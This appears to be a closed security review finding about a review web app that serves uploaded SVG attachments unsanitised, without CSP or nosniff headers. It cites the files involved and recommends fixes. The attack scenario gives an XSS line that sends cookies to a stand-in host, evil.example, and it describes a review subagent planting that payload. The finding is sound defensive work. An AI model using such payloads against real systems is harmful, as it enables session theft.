---
title: SVG attachments served as image/svg+xml without sanitization or CSP
status: closed
origin: adversarial-review
author: mitigation-effectiveness
author_type: agent
created_at: '2026-04-24T14:42:20Z'
iteration: 1
visit: 1
source_ref: null
closed_by: 'fix-loop:FB-13:bolt-1'
bolt: 1
upstream_stage: null
resolution: null
replies: []
---

**Threat:** SVG files accepted as feedback attachments (`data:image/svg+xml;base64,...`) are decoded and written to disk verbatim, then served back to the browser as `image/svg+xml` (http.ts:96). SVG is an XML-based format that supports embedded `<script>` tags, event handlers (`onload`, `onclick`), `<foreignObject>` with HTML, and external entity references. When the browser renders an SVG with `Content-Type: image/svg+xml` in an `<img>` tag, script execution is blocked — but if the URL is opened directly or fetched via a `<script src>`, execution can occur.

**The mitigation claimed:** The attachment route validates the filename extension against a regex (`/^[A-Za-z0-9._-]+\.(png|jpg|jpeg|webp|svg)$/`) and the base64 data URL against `/^data:image\/(png|jpeg|webp|svg\+xml);base64,...$/`. These checks only verify the declared format — they do not inspect or sanitize the SVG content itself.

**Why the mitigation is insufficient:**
1. A malicious reviewer (or a compromised agent) can submit a feedback item with an SVG payload containing `<script>alert(1)</script>` or `<a xlink:href="javascript:...">`. The base64 match accepts any valid base64, so the content passes through unchanged.
2. The attachment is served with `Content-Type: image/svg+xml` (MIME_TYPES[".svg"], http.ts:96). This is the full SVG MIME type, not `image/svg+xml; sandbox`. Modern browsers block scripts inside `<img>` tags for this MIME type, but the same file served via a direct URL or `<object>` tag executes scripts.
3. No `Content-Security-Policy` header is set on the review app. The threat model's Information Disclosure section (A02) says "no secrets stored in feedback files," but CSP is the standard defense for XSS in a web app serving user-generated content.
4. No `X-Content-Type-Options: nosniff` is set, leaving older browsers open to MIME-sniffing the SVG as HTML.

**Root cause vs. symptom:** The mitigation addresses the symptom (restricting which formats are accepted) but not the root cause (user-generated SVG content executing JavaScript in the review SPA's origin). The correct mitigations are: (a) sanitize SVG content on write using a library like DOMPurify (server-side) or svgo with a strict profile, (b) serve SVG attachments with `Content-Disposition: attachment` to prevent inline rendering, or (c) serve SVG with `Content-Type: image/svg+xml` only under a separate subdomain/origin with no cookies/auth.

**File references:**
- `packages/haiku/src/http.ts:91-104` — MIME_TYPES table, `.svg` → `image/svg+xml`
- `packages/haiku/src/http.ts:1477-1487` — attachment serve route, no Content-Disposition
- `packages/haiku/src/state-tools.ts:3208-3224` — attachment decode/write, no content inspection
- `packages/haiku/src/http.ts:89-107` — no security headers (CSP, nosniff) applied globally

**Attack scenario:** An adversarial review subagent creates a feedback item with an SVG containing `<script>document.location='https://evil.example/?cookie='+document.cookie</script>`. The SVG is stored verbatim. When the human reviewer opens the feedback in the SPA and their browser navigates directly to the attachment URL, the script executes in the review app's origin, stealing session data.
